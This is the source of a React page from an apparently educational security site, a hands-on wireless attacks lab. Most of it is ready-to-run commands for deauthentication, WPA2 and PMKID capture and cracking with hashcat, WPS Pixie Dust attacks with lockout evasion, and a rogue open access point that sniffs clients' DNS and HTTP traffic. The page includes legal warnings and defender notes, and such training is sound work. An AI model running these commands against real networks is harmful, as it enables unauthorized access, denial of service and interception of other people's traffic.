'use client'
import React from 'react'
import Link from 'next/link'

const accent = '#aaff00'
const dim = '#5a6a3a'
const border = '#2a3800'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: dim, letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#040404', border: '1px solid ' + border, borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)

const H2 = ({ children }: { children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 600, color: accent, marginTop: '2.5rem', marginBottom: '0.75rem' }}>
    <span style={{ color: border, marginRight: '8px' }}>//</span>{children}
  </h2>
)

const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.9rem' }}>{children}</p>
)

const Note = ({ children }: { children: React.ReactNode }) => (
  <div style={{ background: 'rgba(170,255,0, 0.06)', border: '1px solid rgba(170,255,0, 0.25)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.5rem' }}>
    <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: accent, letterSpacing: '0.15em', marginBottom: '6px' }}>BEGINNER NOTE</div>
    <p style={{ color: '#8a9a9a', fontSize: '0.82rem', lineHeight: 1.7, margin: 0 }}>{children}</p>
  </div>
)

export default function WirelessAttacksLab() {
  return (
    <div style={{ minHeight: '100vh', background: '#020800', color: '#b8c8a8', fontFamily: 'system-ui, sans-serif', padding: '2rem' }}>
      <div style={{ maxWidth: '860px', margin: '0 auto' }}>

        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, marginBottom: '2rem', letterSpacing: '0.1em' }}>
          <Link href="/" style={{ color: dim, textDecoration: 'none' }}>GHOSTNET</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <Link href="/modules/wireless-attacks" style={{ color: dim, textDecoration: 'none' }}>WIRELESS ATTACKS</Link>
          <span style={{ margin: '0 0.5rem' }}>&gt;</span>
          <span style={{ color: accent }}>LAB</span>
        </div>

        <div style={{ marginBottom: '2.5rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: dim, letterSpacing: '0.2em', marginBottom: '0.5rem' }}>HANDS-ON LAB</div>
          <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '2rem', fontWeight: 700, color: accent, margin: 0 }}>Wireless Attacks Lab</h1>
          <p style={{ color: '#5a7a3a', marginTop: '0.75rem', fontSize: '0.9rem' }}>
            Monitor mode, handshake capture, PMKID, WPS Pixie Dust, and rogue AP setup.{' '}
            <Link href="/modules/wireless-attacks" style={{ color: accent, textDecoration: 'none' }}>Back to Concept &rarr;</Link>
          </p>
        </div>

        <div style={{ background: '#020800', border: '1px solid ' + border, borderRadius: '8px', padding: '1.5rem', marginBottom: '2rem' }}>
          <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: dim, letterSpacing: '0.15em', marginBottom: '0.75rem' }}>LAB OVERVIEW</div>
          <P>Work through wireless monitor mode setup, network scanning, WPA2 handshake capture and offline cracking, PMKID attacks, WPS PIN exploitation, and rogue AP deployment. You need: a Kali Linux machine, a wireless card that supports monitor mode and packet injection (Alfa AWUS036ACH or similar), and a lab access point you own.</P>
          <div style={{ background: 'rgba(255,80,80,0.06)', border: '1px solid rgba(255,80,80,0.2)', borderRadius: '4px', padding: '0.75rem 1rem', marginTop: '0.75rem' }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#ff5050' }}>LEGAL WARNING — </span>
            <span style={{ fontSize: '0.82rem', color: '#8a7a7a' }}>Intercepting wireless communications you do not own or have authorization to test is illegal under the Wiretap Act and equivalent laws. Use only your own lab access point.</span>
          </div>
        </div>

        <H2>01 — Enable Monitor Mode and Scan Networks</H2>
        <P>Put your wireless card into monitor mode to see all wireless frames in range, not just those addressed to you. Then use airodump-ng to discover nearby networks and their properties.</P>
        <Note>Not all wireless cards support monitor mode. Virtual machine wireless adapters typically do not. You need a physical USB wireless adapter with a chipset that supports it — Atheros, Ralink, and MediaTek chipsets generally work well. Run "iwconfig" to confirm your adapter is visible, then airmon-ng to check driver support.</Note>
        <Pre label="// EXERCISE 1 — SET UP WIRELESS LAB ENVIRONMENT">{`# Check your wireless interfaces:
iwconfig
ip link show

# Kill processes that may interfere with monitor mode:
sudo airmon-ng check kill

# Enable monitor mode on your wireless adapter:
sudo airmon-ng start wlan0

# Your interface is now named wlan0mon (or similar)
# Verify:
iwconfig wlan0mon

# Scan all visible networks:
sudo airodump-ng wlan0mon

# airodump-ng output columns explained:
# BSSID    = MAC address of the access point
# PWR      = Signal strength (higher negative = weaker, e.g. -40 is strong)
# Beacons  = Number of beacon frames received
# #Data    = Number of data frames captured
# CH       = Channel the AP broadcasts on
# ENC      = Encryption type (WPA2, WPA, WEP, OPN)
# CIPHER   = Cipher suite (CCMP = strong, TKIP = weak)
# AUTH     = Authentication (PSK = personal, MGT = enterprise/RADIUS)
# ESSID    = Network name

# Scan only 2.4GHz band:
sudo airodump-ng --band bg wlan0mon

# Scan only 5GHz band:
sudo airodump-ng --band a wlan0mon

# When done, stop monitor mode:
sudo airmon-ng stop wlan0mon`}</Pre>

        <H2>02 — Capture a WPA2 Four-Way Handshake</H2>
        <P>WPA2-PSK authentication uses a four-way handshake to verify the pre-shared key without transmitting it. By capturing this handshake, you can attempt offline dictionary attacks. You can either wait for a client to connect naturally or force a reconnect with a deauthentication frame.</P>
        <Note>The deauthentication attack sends spoofed management frames telling connected clients they have been disconnected. This is a denial-of-service technique. In a lab context with your own AP, this is expected. Against live networks without permission, this alone is illegal.</Note>
        <Pre label="// EXERCISE 2 — CAPTURE WPA2 HANDSHAKE">{`# Step 1: Identify your target AP from Exercise 1
# Note the BSSID (e.g. AA:BB:CC:DD:EE:FF) and channel (e.g. 6)
# Replace AP_BSSID and AP_CHANNEL with values from your lab AP

# Step 2: Lock airodump to the target channel and save capture:
sudo airodump-ng --bssid AP_BSSID --channel AP_CHANNEL --write handshake_capture wlan0mon

# Keep this running in Terminal 1

# Step 3: In Terminal 2 — force a deauthentication to trigger reconnect:
# Send 5 deauth frames to all clients on the AP:
sudo aireplay-ng --deauth 5 -a AP_BSSID wlan0mon

# Send deauth to a specific client MAC:
sudo aireplay-ng --deauth 5 -a AP_BSSID -c CLIENT_MAC wlan0mon

# Step 4: Watch Terminal 1 — top right corner shows:
# [ WPA handshake: AA:BB:CC:DD:EE:FF ]
# When you see this, the handshake has been captured

# Step 5: Stop airodump with Ctrl+C
# Files created: handshake_capture-01.cap, .csv, .kismet.csv, .kismet.netxml

# Verify the handshake is valid:
sudo aircrack-ng handshake_capture-01.cap

# Expected output if handshake is present:
# Index number of target network ? 1
# [00:00:01] 0/0 keys tested
# KEY FOUND! [ ... ] (only if password is in the wordlist provided)`}</Pre>

        <H2>03 — Crack WPA2 with Hashcat</H2>
        <P>Convert the captured handshake to a format hashcat understands, then run dictionary attacks with wordlists and rules to recover the WPA2 pre-shared key offline. This requires no further interaction with the target network.</P>
        <Pre label="// EXERCISE 3 — OFFLINE WPA2 PASSWORD CRACKING">{`# Install hcxtools (converts pcap to hashcat format):
sudo apt install hcxtools

# Convert capture file to hashcat format 22000 (WPA2):
hcxpcapngtool -o wpa2.hc22000 handshake_capture-01.cap

# Verify the conversion produced output:
wc -l wpa2.hc22000

# Download a wordlist if you do not have rockyou.txt:
# sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Run hashcat dictionary attack (mode 22000 = WPA2):
hashcat -m 22000 wpa2.hc22000 /usr/share/wordlists/rockyou.txt

# Show GPU/CPU hashrate:
hashcat -m 22000 wpa2.hc22000 /usr/share/wordlists/rockyou.txt --status

# Add rules to mutate the wordlist (adds numbers, symbols, capitalizations):
hashcat -m 22000 wpa2.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force short passwords (up to 8 chars, digits only — fast):
hashcat -m 22000 wpa2.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Brute force 8-char lowercase + digit combinations:
hashcat -m 22000 wpa2.hc22000 -a 3 ?l?l?l?l?l?l?d?d

# Show cracked result:
hashcat -m 22000 wpa2.hc22000 --show`}</Pre>

        <H2>04 — PMKID Attack (No Client Required)</H2>
        <P>The PMKID attack, discovered in 2018 by Jens Steube (hashcat author), allows capturing a crackable value directly from the AP without waiting for a client to connect. The PMKID is broadcast in the first EAPOL frame of the handshake and can be derived from the same PSK material.</P>
        <Note>The PMKID attack is faster to execute than traditional handshake capture because you do not need any clients connected to the AP. You simply request association with the AP and capture the PMKID from the response. Cracking time is the same as WPA2 — it is only the capture phase that is faster.</Note>
        <Pre label="// EXERCISE 4 — CAPTURE AND CRACK PMKID">{`# Install hcxdumptool:
sudo apt install hcxdumptool

# Capture PMKID from all visible APs (or target a specific one):
# Run for 60 seconds on your lab interface in monitor mode:
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=3

# Target only a specific AP by BSSID:
# Create a filterlist with your AP's BSSID (no colons):
echo "AABBCCDDEEFF" > target_ap.txt
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --filterlist_ap=target_ap.txt --filtermode=2

# Convert the pcapng to hashcat format:
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# Check if any PMKIDs were captured:
wc -l pmkid.hc22000

# Expected hash format in the file:
# 22000 hash line containing PMKID, AP MAC, CLIENT MAC, SSID

# Crack using hashcat (same command as handshake, mode 22000):
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# With rules:
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked results:
hashcat -m 22000 pmkid.hc22000 --show`}</Pre>

        <H2>05 — WPS Pixie Dust Attack</H2>
        <P>Wi-Fi Protected Setup (WPS) has a design flaw in its PIN authentication: the eight-digit PIN is validated in two halves, reducing the brute-force space from 100 million to 11,000 guesses. The Pixie Dust attack is even more severe — it exploits a weak random number generator in some AP firmware to recover the PIN in seconds.</P>
        <Pre label="// EXERCISE 5 — EXPLOIT WPS PIN WEAKNESS">{`# Install required tools:
sudo apt install reaver wash

# Step 1: Find APs with WPS enabled using wash:
sudo wash -i wlan0mon

# wash output columns:
# BSSID        = AP MAC address
# Ch           = Channel
# dBm          = Signal strength
# WPS          = WPS version
# Lck          = Locked (Yes = WPS locked after too many attempts)
# Vendor       = AP firmware vendor
# ESSID        = Network name

# Step 2: Run Pixie Dust attack against a WPS-enabled lab AP:
# Replace AP_BSSID and AP_CHANNEL with your target values
sudo reaver -i wlan0mon -b AP_BSSID -c AP_CHANNEL -K 1 -vvv

# Flags explained:
# -K 1   = Pixie Dust mode (offline attack on RNG weakness)
# -vvv   = Maximum verbosity (shows all exchange details)

# Expected output if vulnerable:
# [+] WPS PIN: '12345678'
# [+] WPA PSK: 'network_password_here'
# [+] AP SSID: 'LabNetwork'

# Step 3: If Pixie Dust fails, try online PIN brute force (slower):
sudo reaver -i wlan0mon -b AP_BSSID -c AP_CHANNEL -vvv

# Add delay to avoid WPS lockout:
sudo reaver -i wlan0mon -b AP_BSSID -c AP_CHANNEL -d 5 -r 3:30 -vvv
# -d 5   = 5 second delay between attempts
# -r 3:30 = after 3 attempts, sleep 30 seconds (avoids lockout)

# Mitigations: Disable WPS entirely on your router.
# Even if PIN is disabled, some routers still expose the WPS exchange.`}</Pre>

        <H2>06 — Set Up a Rogue AP with Hostapd</H2>
        <P>A rogue access point mimics a legitimate network to capture connecting clients. This exercise creates an open AP in a lab environment to understand how client association works and what traffic a rogue AP operator can see.</P>
        <Pre label="// EXERCISE 6 — CREATE AND ANALYSE A ROGUE AP">{`# Install hostapd and dnsmasq:
sudo apt install hostapd dnsmasq

# Create hostapd configuration file:
cat > /tmp/rogue_ap.conf << 'CONF'
interface=wlan0
driver=nl80211
ssid=FreeWifi_Lab
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
CONF

# Configure dnsmasq for DHCP on the rogue AP interface:
cat > /tmp/dnsmasq_rogue.conf << 'CONF'
interface=wlan0
dhcp-range=192.168.99.10,192.168.99.50,255.255.255.0,12h
dhcp-option=3,192.168.99.1
dhcp-option=6,192.168.99.1
server=8.8.8.8
log-queries
log-dhcp
CONF

# Set an IP on the AP interface:
sudo ip addr add 192.168.99.1/24 dev wlan0
sudo ip link set wlan0 up

# Enable NAT so clients get internet through the rogue AP:
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Start dnsmasq and hostapd:
sudo dnsmasq -C /tmp/dnsmasq_rogue.conf
sudo hostapd /tmp/rogue_ap.conf

# Capture all DNS queries from connected clients:
sudo tcpdump -i wlan0 port 53 -n

# Capture all unencrypted HTTP traffic:
sudo tcpdump -i wlan0 port 80 -A

# What defenders see:
# Rogue APs appear in wireless scans as duplicate SSIDs
# Enterprise detection: compare AP BSSIDs against known AP inventory
# Tools: Kismet, Wireless IDS, 802.11 Management Frame Protection (MFP)

# Clean up:
# sudo killall hostapd dnsmasq
# sudo iptables -t nat -F`}</Pre>

        <H2>Check Your Understanding</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem', marginBottom: '2rem' }}>
          {[
            '1. Why does a wireless card need to support monitor mode, and how is monitor mode different from promiscuous mode?',
            '2. What is captured in a WPA2 four-way handshake, and why can it be cracked offline without the AP?',
            '3. What advantage does the PMKID attack have over traditional handshake capture?',
            '4. The WPS PIN is 8 digits but Pixie Dust does not brute force it. What does Pixie Dust actually exploit?',
            '5. What information can an operator of a rogue AP see from clients that connect to it?',
          ].map((q, i) => (
            <div key={i} style={{ background: '#020800', border: '1px solid ' + border, borderRadius: '4px', padding: '0.85rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.8rem', color: '#7a9a5a' }}>{q}</div>
          ))}
        </div>

        <H2>Further Practice</H2>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '3rem' }}>
          {[
            { label: 'TryHackMe — WiFi Hacking 101', url: 'https://tryhackme.com/room/wifihacking101' },
            { label: 'TryHackMe — Wireless Attacks (Security Engineer Path)', url: 'https://tryhackme.com/room/wifihacking101' },
            { label: 'Aircrack-ng Official Documentation and Wiki', url: 'https://www.aircrack-ng.org/documentation.html' },
            { label: 'Hashcat WPA2 Attack Mode Reference', url: 'https://hashcat.net/wiki/doku.php?id=hashcat' },
          ].map((r, i) => (
            <a key={i} href={r.url} target="_blank" rel="noopener noreferrer" style={{ display: 'block', background: '#020800', border: '1px solid ' + border, borderRadius: '4px', padding: '0.75rem 1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>
              &rarr; {r.label}
            </a>
          ))}
        </div>

        <div style={{ borderTop: '1px solid ' + border, paddingTop: '1.5rem', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <Link href="/modules/wireless-attacks" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: dim, textDecoration: 'none' }}>&larr; Back to Concept</Link>
          <Link href="/modules" style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: accent, textDecoration: 'none' }}>All Modules &rarr;</Link>
        </div>

      </div>
    </div>
  )
}
